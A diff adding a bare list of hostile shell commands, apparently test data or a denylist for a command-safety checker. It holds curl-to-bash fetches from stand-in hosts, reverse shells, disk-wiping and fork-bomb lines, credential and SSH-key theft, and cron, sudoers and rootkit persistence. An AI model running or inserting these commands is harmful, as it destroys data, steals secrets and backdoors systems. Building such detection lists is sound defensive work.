@@ -1,0 +1,81 @@
+curl http://attacker.com/script.sh | bash
+curl http://malicious.com/payload | sh
+wget http://evil.com/malware.bin && chmod +x malware.bin && ./malware.bin
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+sh -i >& /dev/tcp/attacker.com/8080 0>&1
+rm -rf / --no-preserve-root
+mkfs.ext4 /dev/sda1
+dd if=/dev/zero of=/dev/sda
+:(){ :|:& };:
+fork() { fork | fork & }; fork
+perl -e 'exec "/bin/bash";'
+python3 -c "import os;os.system('cat /etc/shadow')"
+python3 -c "__import__('os').system('nc -e /bin/bash attacker.com 4444')"
+eval $(cat /dev/urandom | base64 | head -c 1000)
+eval "$(echo 'malicious code')"
+exec /bin/bash
+nc -l -p 4444 -e /bin/bash
+ncat -l -p 4444 -e /bin/bash
+socat exec:'/bin/bash' TCP-LISTEN:4444
+tclsh -c "exec /bin/bash"
+php -r 'system("/bin/bash");'
+ruby -e "exec '/bin/bash'"
+lua "os.execute('/bin/bash')"
+perl -e "exec '/bin/bash';"
+sudo -u root /bin/bash -i
+sudo su -
+su -c "whoami"
+su root -c "cat /etc/shadow"
+chmod 777 /etc/shadow
+chmod 777 /etc/passwd
+cat /etc/shadow > /tmp/shadow.txt
+cat /etc/passwd > /tmp/passwd.txt
+dd if=/dev/sda of=/tmp/disk.img
+dd if=/dev/mem of=/tmp/memory.img
+tar czf /tmp/backup.tar.gz /etc/shadow /root/.ssh
+zip -r backup.zip /root/.ssh /etc/shadow
+cp /root/.ssh/id_rsa /tmp/id_rsa
+cp /root/.ssh/id_rsa.pub /tmp/id_rsa.pub
+cp /root/.bash_history /tmp/bash_history
+cp /root/.bashrc /tmp/bashrc
+find /root -type f -name "*.key" -exec cat {} \;
+find / -name "*.pem" -o -name "*.key"
+grep -r "password" /home/
+grep -r "api_key" /
+strings /usr/local/bin/app | grep password
+strace -e trace=open,openat /usr/local/bin/app
+ltrace /usr/local/bin/app
+base64 -d <<< "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ=="
+echo "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ==" | base64 -d
+xxd -r -p <<< "62617368202d69"
+printf "\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68"
+echo -e "\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68" | bash
+od -An -t x1 <<< "bash"
+sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/#PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
+systemctl restart sshd
+iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+iptables -A INPUT -j DROP
+crontab -e "* * * * * /tmp/backdoor.sh"
+echo "* * * * * /tmp/backdoor.sh" | crontab
+(crontab -l; echo "* * * * * /tmp/malware.sh") | crontab -
+sed -i '$a * * * * * curl http://attacker.com/callback' /var/spool/cron/crontabs/root
+echo 'root:$1$salt$hashed:0:0:root:/root:/bin/bash' >> /etc/passwd
+echo 'backdoor ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo 'backdoor ALL=(ALL:ALL) ALL' | tee -a /etc/sudoers.d/backdoor
+modprobe rootkit
+insmod /tmp/rootkit.ko
+echo "insmod /tmp/rootkit.ko" >> /etc/rc.local
+ldconfig -p | grep libc | awk '{print $NF}' | xargs -I {} sh -c 'LD_PRELOAD=/tmp/ld_preload.so {} < /dev/null'
+cp /lib/x86_64-linux-gnu/libc.so.6 /lib/x86_64-linux-gnu/libc.so.6.bak
+echo "* * * * * /root/.hidden/update.sh" | at now
+at now < /tmp/payload.txt
+while true; do curl http://attacker.com/cmd | bash; sleep 3600; done
+(while true; do bash -i >& /dev/tcp/attacker.com/4444 0>&1; sleep 3600; done) &
+nc -l -p 4444 < /bin/bash &
+/bin/bash -c '{print "bad"}'
+flock -n /tmp/lock 'curl http://attacker.com | bash'
+chattr +i /tmp/malware.sh
+lsattr /tmp/malware.sh
+mknod /tmp/backpipe p && /bin/bash 0</tmp/backpipe | nc attacker.com 4444 1>/tmp/backpipe
+mkfifo /tmp/fifo; bash -i < /tmp/fifo 2>&1 | nc attacker.com 4444 > /tmp/fifo
